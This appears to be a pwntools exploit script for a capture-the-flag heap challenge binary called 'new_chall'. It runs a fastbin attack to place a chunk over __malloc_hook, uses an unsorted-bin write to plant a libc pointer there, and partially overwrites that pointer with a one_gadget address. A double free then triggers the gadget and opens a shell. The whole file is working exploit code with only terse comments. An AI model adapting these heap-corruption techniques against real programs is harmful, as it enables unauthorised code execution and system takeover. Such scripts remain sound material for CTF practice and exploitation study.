from pwn import *
#context.log_level="debug"
def cmd(c):
	p.sendlineafter("3. Free\n",str(c))
def malloc(size,idx):
	cmd(1)
	p.sendlineafter("Enter size of chunk :",str(size))
	p.sendlineafter("Enter index :",str(idx))
def free(idx):
	cmd(3)
	p.sendlineafter("Enter index :",str(idx))
def edit(idx,c):
	cmd(2)
	p.sendlineafter("Enter index of chunk :",str(idx))
	p.sendafter("Enter data :",c)
p=process("./new_chall")

p.readuntil("Enter name :")
p.sendline("nier")
#fastbin atk to control __malloc_hook
malloc(0x140,0)
malloc(0x18,1)#
free(0)
malloc(0x68,2)
malloc(0x68,3)
malloc(0x68,4)
free(3)
free(4)
edit(4,"\x00")
edit(0,"\xed\x1a")
malloc(0x68,6)
malloc(0x68,7)
malloc(0x68,8)#control malloc__hook

#fixfastbin
free(7)
edit(7,p64(0))
#unsorted bin to make malloc_hook=&main_arena+0x58
malloc(0x58,10)
malloc(0x88,11)
malloc(0x88,12)
free(11)
edit(11,p64(0xdeadbeef)+'\x00')
malloc(0x88,13)
#partial write malloc_hook to one_gadget
edit(8,p64(0xdeadbeefdeadbeef)+"AAA"+p64(0xdddddddddddddfdd)+"\xa4\xd2\xaf")
#use printerr to make esp+0x50=0 to get shell
free(12)
free(12)
#over
try:
	p.interactive(">")
except:
	p.close()










